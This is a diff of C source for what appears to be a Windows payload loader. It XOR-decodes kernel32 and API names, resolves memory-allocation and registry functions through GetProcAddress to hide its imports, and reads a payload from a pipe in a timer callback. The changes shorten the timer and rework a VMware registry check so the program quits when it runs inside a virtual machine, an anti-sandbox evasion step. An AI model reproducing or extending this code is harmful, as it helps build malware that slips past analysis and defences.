@@ -43,7 +43,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	pAllocate = (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandle(de_xor(kernel, sizeof(kernel), key)), de_xor(procName, sizeof(procName), key));
 
 
-	UINT_PTR timerId = SetTimer(NULL, 1, 60000, TimerProc);
+	UINT_PTR timerId = SetTimer(NULL, 1, 1, TimerProc);
 
 	MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
@@ -66,6 +66,7 @@ VOID CALLBACK TimerProc(HWND hWnd, UINT message, UINT_PTR timerId, DWORD dwTime)
 	{
 		exit(1);
 	}
+	printf("This has executed!");
 	while (fread(&byte, sizeof(byte), 1, g_context.fpipe))
 	{
 		g_context.payload[counter] = byte;
@@ -91,20 +92,54 @@ LPCSTR de_xor(unsigned char *payload, signed int payloadSize, unsigned char key)
 
 BOOL CheckRegisteryKey()
 {
-	// Obfuscate the function calls that check register keys 
-	HKEY regHandle = NULL;
-	
-	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", 0, KEY_READ, &regHandle) == ERROR_SUCCESS)
-	{
-		if (RegQueryValueExW(regHandle, (LPCWSTR)"VMware SCSI Controller", NULL, NULL, NULL, NULL))
-		{
-			
-			return TRUE;
-		}
-	}
-	// Closes the handle to the specified registery key (used because the key (sub key) is not a predefined window reg key that is kept open all the time)
-	RegCloseKey(regHandle);
-	return FALSE;
+    HKEY regHandle = NULL;
+    LONG (WINAPI *rOpenKey)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
+    LSTATUS (WINAPI *rQueryValue)(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
+    LSTATUS (WINAPI *rClose)(HKEY);
+
+    HMODULE hModule = GetModuleHandle("advapi32.dll");
+    if (!hModule) {
+        printf("Failed to load advapi32.dll\n");
+        return FALSE;
+    }
+
+    rOpenKey = (LONG (WINAPI *)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY)) GetProcAddress(hModule, "RegOpenKeyExW");
+    if (!rOpenKey) {
+        printf("Failed to load RegOpenKeyExW\n");
+        return FALSE;
+    }
+
+    rQueryValue = (LSTATUS (WINAPI *)(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD)) 
+        GetProcAddress(hModule, "RegQueryValueExW");
+    if (!rQueryValue) {
+        printf("Failed to load RegQueryValueExW\n");
+        return FALSE;
+    }
+
+    rClose = (LSTATUS (WINAPI *)(HKEY)) GetProcAddress(hModule, "RegCloseKey");
+    if (!rClose) {
+        printf("Failed to load RegCloseKey\n");
+        return FALSE;
+    }
+
+    // Open registry key
+    if (rOpenKey(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", 0, KEY_READ, &regHandle) == ERROR_SUCCESS)
+    {
+        // Query registry value
+        if (rQueryValue(regHandle, L"VMware SCSI Controller", NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
+        {
+            rClose(regHandle); // Close handle
+			exit(1);
+            return TRUE;
+        }
+        rClose(regHandle); // Close handle
+    }
+
+    // Cleanup if key wasn't opened successfully
+    if (regHandle) {
+        rClose(regHandle);
+    }
+    return FALSE;
 }
 
 
